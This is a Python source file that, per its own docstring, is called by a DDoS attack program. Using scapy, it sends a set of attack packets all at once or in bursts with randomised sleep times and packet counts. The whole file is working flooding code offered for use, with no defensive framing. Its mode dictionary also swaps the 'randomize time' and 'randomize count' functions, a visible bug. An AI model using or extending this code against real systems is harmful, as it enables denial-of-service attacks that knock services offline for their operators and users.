"""
Called by the attack program 
Takes the ddos object and sends it as specified
"""

from scapy.all import *
from time import sleep
from random import randint

def send_all_at_once(modified_ddos_attack_object, script_args):
   packet_number = script_args["count"]
   for packet in modified_ddos_attack_object.packets:
      send(packet, count=packet_number)

def send_randomize_send_time(
   modified_ddos_attack_object, script_args):
   packet_number = script_args["count"]
   send_count = script_args["send count"]
   for packet in modified_ddos_attack_object.packets:
      while((packet_number - send_count) >= 0):
         random_send_time = randint(0, 10)
         sleep(random_send_time)
         print("Sleep time", random_send_time, "Send count", send_count)
         packet_number -= send_count
         send(packet, count=send_count)

def send_randomize_send_count(
   modified_ddos_attack_object, script_args):
   packet_number = script_args["count"]
   send_time = script_args["send time"]
   send_count = 0
   for packet in modified_ddos_attack_object.packets:
      while((packet_number - send_count) >= 0):
         sleep(send_time)
         random_send_count = randint(30, 50)
         send_count = random_send_count
         print("Sleep time", send_time, "Send count", random_send_count)
         packet_number -= random_send_count
         send(packet, count=random_send_count)

def send_randomize_send_time_and_count(
   modified_ddos_attack_object, script_args):
   packet_number = script_args["count"]
   for packet in modified_ddos_attack_object.packets:
      random_send_count = 0
      while((packet_number - random_send_count) >= 0):
         random_send_time = randint(0, 10)
         random_send_count = randint(30,50)
         sleep(random_send_time)
         print("Sleep time", random_send_time, "Send count", random_send_count)
         packet_number -= random_send_count
         send(packet, count=random_send_count)

send_type_dict = {
   "all at once" : send_all_at_once,
   "randomize time" : send_randomize_send_count,
   "randomize count" : send_randomize_send_time,
   "randomize time and count" : send_randomize_send_time_and_count
   }

def send_ddos_attack_object(modified_ddos_attack_object, script_args):
   send_function = send_type_dict[script_args["send type"]]
   send_function(modified_ddos_attack_object, script_args)